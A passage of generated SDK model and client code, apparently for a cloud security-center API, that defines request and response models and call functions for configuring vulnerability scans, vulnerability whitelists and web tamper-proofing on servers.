 * @param request ModifyVulTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyVulTargetResponse
 */
async function modifyVulTargetWithOptions(request: ModifyVulTargetRequest, runtime: Util.RuntimeOptions): ModifyVulTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configurations of the vulnerability scan feature for a server.
 *
 * @param request ModifyVulTargetRequest
 * @return ModifyVulTargetResponse
 */
async function modifyVulTarget(request: ModifyVulTargetRequest): ModifyVulTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulTargetWithOptions(request, runtime);
}

model ModifyVulTargetConfigRequest {
  config?: string(name='Config', description='Specifies whether to enable vulnerability detection. Valid values:

*   **on**: yes
*   **off**: no

This parameter is required.', example='off'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability

This parameter is required.', example='cve'),
  uuid?: string(name='Uuid', description='The UUID of the server.

This parameter is required.', example='inet-7c676676-06fa-442e-90fb-b802e5d6****'),
}

model ModifyVulTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1FF908BA-ADD8-5138-8595-614C6E3C6658'),
}

model ModifyVulTargetConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyVulTargetConfigResponseBody(name='body'),
}

/**
 * @summary Configures vulnerability scan for a server.
 *
 * @param request ModifyVulTargetConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyVulTargetConfigResponse
 */
async function modifyVulTargetConfigWithOptions(request: ModifyVulTargetConfigRequest, runtime: Util.RuntimeOptions): ModifyVulTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Configures vulnerability scan for a server.
 *
 * @param request ModifyVulTargetConfigRequest
 * @return ModifyVulTargetConfigResponse
 */
async function modifyVulTargetConfig(request: ModifyVulTargetConfigRequest): ModifyVulTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulTargetConfigWithOptions(request, runtime);
}

model ModifyVulWhitelistTargetRequest {
  id?: long(name='Id', description='The ID of the whitelist.

>  You can call the [DescribeVulWhitelist](~~DescribeVulWhitelist~~) operation to query the IDs of whitelists.

This parameter is required.', example='2533681'),
  reason?: string(name='Reason', description='The reason why you add the server to the whitelist.', example='1221'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='42.120.75.150'),
  targetInfo?: string(name='TargetInfo', description='The applicable scope of the whitelist. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: the type of the applicable scope. Valid values:

    *   **GroupId**: the ID of a server group
    *   **Uuid**: the UUID of a server

*   **uuids**: the UUIDs of servers

*   **groupIds**: the IDs of server groups

>  If you leave this parameter empty, all servers are added to the whitelist. If you set the **type** field to **GroupId**, you must also specify the **groupIds** field. If you set the **type** field to **Uuid**, you must also specify the **uuids** field.', example='{
      "type": "GroupId",
      "uuids": [],
      "groupIds": [
            10782678
      ]
}'),
}

model ModifyVulWhitelistTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='896AC4F0-C881-502B-BFC7-4751C5E3DEAA'),
}

model ModifyVulWhitelistTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyVulWhitelistTargetResponseBody(name='body'),
}

/**
 * @summary Modifies the servers that are added to a vulnerability whitelist.
 *
 * @param request ModifyVulWhitelistTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyVulWhitelistTargetResponse
 */
async function modifyVulWhitelistTargetWithOptions(request: ModifyVulWhitelistTargetRequest, runtime: Util.RuntimeOptions): ModifyVulWhitelistTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulWhitelistTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the servers that are added to a vulnerability whitelist.
 *
 * @param request ModifyVulWhitelistTargetRequest
 * @return ModifyVulWhitelistTargetResponse
 */
async function modifyVulWhitelistTarget(request: ModifyVulWhitelistTargetRequest): ModifyVulWhitelistTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulWhitelistTargetWithOptions(request, runtime);
}

model ModifyWebLockCreateConfigRequest {
  defenceMode?: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode

This parameter is required.', example='block'),
  dir?: string(name='Dir', description='The directory that you want to protect.

This parameter is required.', example='/home/admin/tomcat'),
  exclusiveDir?: string(name='ExclusiveDir', description='The directory for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/test'),
  exclusiveFile?: string(name='ExclusiveFile', description='The file for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/apache.log'),
  exclusiveFileType?: string(name='ExclusiveFileType', description='The type of file for which you want to disable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='jpg'),
  inclusiveFile?: string(name='InclusiveFile', description='The file for which you want to enable web tamper proofing.

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='/home/admin/test.log'),
  inclusiveFileType?: string(name='InclusiveFileType', description='The type of file for which you want to enable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='jpg'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  localBackupDir?: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.

This parameter is required.', example='/usr/local/backup'),
  mode?: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified sub-directories, file types, and files in the protected directories.', example='whitelist'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='39.170.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to add a directory to protect.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='inet-12345****'),
}

model ModifyWebLockCreateConfigResponseBody = {
  configId?: string(name='ConfigId', description='The configuration ID of the protected directory.', example='1404656'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockCreateConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyWebLockCreateConfigResponseBody(name='body'),
}

/**
 * @summary Adds a directory to protect for a specified server.
 *
 * @param request ModifyWebLockCreateConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyWebLockCreateConfigResponse
 */
async function modifyWebLockCreateConfigWithOptions(request: ModifyWebLockCreateConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockCreateConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.inclusiveFile)) {
    query['InclusiveFile'] = request.inclusiveFile;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockCreateConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds a directory to protect for a specified server.
 *
 * @param request ModifyWebLockCreateConfigRequest
 * @return ModifyWebLockCreateConfigResponse
 */
async function modifyWebLockCreateConfig(request: ModifyWebLockCreateConfigRequest): ModifyWebLockCreateConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockCreateConfigWithOptions(request, runtime);
}

model ModifyWebLockDeleteConfigRequest {
  id?: int32(name='Id', description='The ID of the protected directory that you want to delete.

> You can call the [DescribeWebLockConfigList](~~DescribeWebLockConfigList~~) operation to query the IDs of protected directories.

This parameter is required.', example='12'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to delete the protected directory.

> You can call the [DescribeWebLockConfigList](~~DescribeWebLockConfigList~~) operation to query the UUIDs of servers.

This parameter is required.', example='7f7fe9a2-55de-4b9d-a37a-0d981d36****'),
}

model ModifyWebLockDeleteConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='299D0992-271A-5750-ACEB-46D322862BFF'),
}

model ModifyWebLockDeleteConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyWebLockDeleteConfigResponseBody(name='body'),
}

/**
 * @summary Deletes a directory on a specified server from the protected directories of web tamper proofing.
 *
 * @description After you delete a directory that has web tamper proofing enabled on a server, files in the directory are no longer protected by web tamper proofing. The information about the websites that are hosted on the server may be maliciously modified by attackers. Proceed with caution.
 *
 * @param request ModifyWebLockDeleteConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyWebLockDeleteConfigResponse
 */
async function modifyWebLockDeleteConfigWithOptions(request: ModifyWebLockDeleteConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockDeleteConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockDeleteConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a directory on a specified server from the protected directories of web tamper proofing.
 *
 * @description After you delete a directory that has web tamper proofing enabled on a server, files in the directory are no longer protected by web tamper proofing. The information about the websites that are hosted on the server may be maliciously modified by attackers. Proceed with caution.
 *
 * @param request ModifyWebLockDeleteConfigRequest
 * @return ModifyWebLockDeleteConfigResponse
 */
async function modifyWebLockDeleteConfig(request: ModifyWebLockDeleteConfigRequest): ModifyWebLockDeleteConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockDeleteConfigWithOptions(request, runtime);
}

model ModifyWebLockProcessStatusRequest {
  dealAll?: int32(name='DealAll', description='Specifies whether to change the status of the process on multiple servers on which the process runs at the same time. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  operateInfo?: string(name='OperateInfo', description='The parameters required to change the status of multiple processes at a time. The value is in the JSON format.', example='[{"processPath":"/etc/test1","uuid":"0c1714dc-f7a3-4265-8364-7aa3fce8****"},{"processPath":"/etc/test2","uuid":"1cc45e7d-7698-4b2c-89d8-e8cba407****"}]'),
  processPath?: [ string ](name='ProcessPath', description='The paths to the processes.'),
  status?: int32(name='Status', description='The status of the process. Valid values:

*   **0**: cancels adding the process to the process whitelist
*   **1**: adds the process to the process whitelist', example='1'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='bc8510e7-7327-4030-b75c-956e434d****'),
}

model ModifyWebLockProcessStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6A540B52-2441-5493-902B-37376C412776'),
}

model ModifyWebLockProcessStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyWebLockProcessStatusResponseBody(name='body'),
}

/**
 * @summary Changes the status of processes for web tamper proofing.
 *
 * @param request ModifyWebLockProcessStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyWebLockProcessStatusResponse
 */
async function modifyWebLockProcessStatusWithOptions(request: ModifyWebLockProcessStatusRequest, runtime: Util.RuntimeOptions): ModifyWebLockProcessStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealAll)) {
    query['DealAll'] = request.dealAll;
  }
  if (!Util.isUnset(request.operateInfo)) {
    query['OperateInfo'] = request.operateInfo;
  }
  if (!Util.isUnset(request.processPath)) {
    query['ProcessPath'] = request.processPath;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockProcessStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Changes the status of processes for web tamper proofing.
 *
 * @param request ModifyWebLockProcessStatusRequest
 * @return ModifyWebLockProcessStatusResponse
 */
async function modifyWebLockProcessStatus(request: ModifyWebLockProcessStatusRequest): ModifyWebLockProcessStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockProcessStatusWithOptions(request, runtime);
}

model ModifyWebLockRefreshRequest {
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to refresh the status of the web tamper proofing feature.

>  You can call the [DescribeWebLockBindList](~~DescribeWebLockBindList~~) operation to query the servers for which the web tamper proofing feature is enabled.', example='55c0f41b-3093-47a7-8eae-02d3a584****'),
}

model ModifyWebLockRefreshResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='1CF8C834-8028-5E01-96E2-0F065EA99F6D'),
}

model ModifyWebLockRefreshResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyWebLockRefreshResponseBody(name='body'),
}

/**
 * @summary Refreshes the status of the web tamper proofing feature for a server.
 *
 * @description If an exception occurs when you enable or disable the web tamper proofing feature for a server, you can call this operation to refresh the status of the web tamper proofing feature.
 *
 * @param request ModifyWebLockRefreshRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyWebLockRefreshResponse
 */
async function modifyWebLockRefreshWithOptions(request: ModifyWebLockRefreshRequest, runtime: Util.RuntimeOptions): ModifyWebLockRefreshResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockRefresh',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Refreshes the status of the web tamper proofing feature for a server.
 *
 * @description If an exception occurs when you enable or disable the web tamper proofing feature for a server, you can call this operation to refresh the status of the web tamper proofing feature.
 *
 * @param request ModifyWebLockRefreshRequest
 * @return ModifyWebLockRefreshResponse
 */
async function modifyWebLockRefresh(request: ModifyWebLockRefreshRequest): ModifyWebLockRefreshResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockRefreshWithOptions(request, runtime);
}

model ModifyWebLockStartRequest {
  defenceMode?: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode

This parameter is required.', example='block'),
  dir?: string(name='Dir', description='The directory for which you want to enable web tamper proofing. Separate multiple directories with commas (,).

This parameter is required.', example='/home/admin/tomcat'),
  exclusiveDir?: string(name='ExclusiveDir', description='The directory for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/java'),
  exclusiveFile?: string(name='ExclusiveFile', description='The file for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/tomcat/localhost.log'),
  exclusiveFileType?: string(name='ExclusiveFileType', description='The type of the file for which you want to disable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='jpg'),
  inclusiveFileType?: string(name='InclusiveFileType', description='The type of the file for which you want to enable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='php'),
  localBackupDir?: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.\\\\
The directory format of a Linux server is different from that of a Windows server. You must enter the directory in the required format based on your operating system. Examples:

*   Linux server: /usr/local/aegis/bak
*   Windows server: C:\\\\Program Files (x86)\\\\Alibaba\\\\Aegis\\\\bak

This parameter is required.', example='/usr/local/backup'),
  mode?: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified subdirectories, file types, and files in the protected directory.

This parameter is required.', example='whitelist'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to enable web tamper proofing.

This parameter is required.', example='80d2f7d6-31a9-4d7f-8ff4-7ecc42f89ca****'),
}

model ModifyWebLockStartResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockStartResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyWebLockStartResponseBody(name='body'),
}

/**
 * @summary Enables web tamper proofing for a specified server.
 *
 * @param request ModifyWebLockStartRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyWebLockStartResponse
 */
async function modifyWebLockStartWithOptions(request: ModifyWebLockStartRequest, runtime: Util.RuntimeOptions): ModifyWebLockStartResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockStart',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables web tamper proofing for a specified server.
 *
 * @param request ModifyWebLockStartRequest
 * @return ModifyWebLockStartResponse
 */
async function modifyWebLockStart(request: ModifyWebLockStartRequest): ModifyWebLockStartResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockStartWithOptions(request, runtime);
}

model ModifyWebLockStatusRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='125.71.XX.XX'),
  status?: string(name='Status', description='Specifies whether to enable or disable web tamper proofing for the specified server. Valid values:

*   **on**: enables web tamper proofing
*   **off**: disables web tamper proofing

> After you disable web tamper proofing for the specified server, one quota is released.

This parameter is required.', example='on'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to enable or disable web tamper proofing. You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='inet-1234567****'),
}

model ModifyWebLockStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyWebLockStatusResponseBody(name='body'),
}

/**
 * @summary Enables or disables web tamper proofing for a server.
 *
 * @param request ModifyWebLockStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyWebLockStatusResponse
 */
async function modifyWebLockStatusWithOptions(request: ModifyWebLockStatusRequest, runtime: Util.RuntimeOptions): ModifyWebLockStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables web tamper proofing for a server.
 *
 * @param request ModifyWebLockStatusRequest
 * @return ModifyWebLockStatusResponse
 */
async function modifyWebLockStatus(request: ModifyWebLockStatusRequest): ModifyWebLockStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockStatusWithOptions(request, runtime);
}

model ModifyWebLockUnbindRequest {
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to disable web tamper proofing.

> You can call the [DescribeWebLockBindList](~~DescribeWebLockBindList~~) operation to query the UUIDs of servers.', example='8d217d3f-6999-43a6-a435-c7a6854180e9'),
}

model ModifyWebLockUnbindResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F0A8A039-930D-5EC1-97C8-43F05776188A'),
}

model ModifyWebLockUnbindResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyWebLockUnbindResponseBody(name='body'),
}

/**
 * @summary Disables web tamper proofing for a specified server.
 *
 * @param request ModifyWebLockUnbindRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyWebLockUnbindResponse
 */
async function modifyWebLockUnbindWithOptions(request: ModifyWebLockUnbindRequest, runtime: Util.RuntimeOptions): ModifyWebLockUnbindResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockUnbind',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Disables web tamper proofing for a specified server.
 *
 * @param request ModifyWebLockUnbindRequest
 * @return ModifyWebLockUnbindResponse
 */
async function modifyWebLockUnbind(request: ModifyWebLockUnbindRequest): ModifyWebLockUnbindResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockUnbindWithOptions(request, runtime);
}

model ModifyWebLockUpdateConfigRequest {
  defenceMode?: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode

This parameter is required.', example='block'),
  dir?: string(name='Dir', description='The directory for which you want to enable web tamper proofing.

This parameter is required.', example='/home/admin/tomcat'),
  exclusiveDir?: string(name='ExclusiveDir', description='The directory for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/test'),
  exclusiveFile?: string(name='ExclusiveFile', description='The file for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/apache.log'),
  exclusiveFileType?: string(name='ExclusiveFileType', description='The type of the file for which you want to disable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='jpg'),
